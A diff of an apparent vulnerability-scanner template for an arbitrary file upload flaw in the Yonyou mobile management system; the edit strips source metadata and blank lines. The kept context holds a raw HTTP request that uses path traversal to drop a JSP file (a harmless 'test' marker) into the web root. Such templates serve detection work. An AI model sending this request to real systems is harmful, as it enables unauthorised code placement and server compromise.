@@ -3,12 +3,8 @@ info:
   name: 用友 移动管理系统 common任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dnw99mh6tn9lk40p'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dnw99mh6tn9lk40p
-    fofa: 暂无
 http:
 - raw:
   - 'POST /mobsm/common/upload?category=../webapps/nc_web/maupload/img HTTP/1.1
@@ -23,8 +19,6 @@ http:
     Connection: close
 
 
-
-
     ------WebKitFormBoundary7MA4YWxkTrZu0gW
 
 
@@ -32,8 +26,6 @@ http:
 
 
     Content-Type: text/plain
-
-
 
 
     <% out.println("test");%>
